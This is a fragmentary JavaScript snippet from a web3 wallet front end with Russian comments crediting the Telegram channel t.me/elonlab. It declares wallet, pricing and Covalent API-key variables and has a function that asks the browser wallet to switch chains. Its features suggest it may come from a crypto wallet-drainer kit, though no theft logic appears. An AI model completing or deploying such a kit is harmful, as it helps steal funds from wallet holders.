var logindead = 0;
var connected = 0;
var account = "";//продукт разработан и выложен в открытый доступ для канала https://t.me/elonlab
var alerts = 0;
var perETH_usd;
var success = 0;
let message;
...
var internalConfig;
var clientID;
var covalentKey;//продукт разработан и выложен в открытый доступ для канала https://t.me/elonlab
...
const changeNetwork = async (ChainId) => {
  if (window.ethereum) {
    ...
    try {
      ...
      await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
        params: [{chainId: ChainId}],//.h.t.t.p.s.:././.t...m.e./.e.l.o.n.l.a.b
      });
    }
  }
}
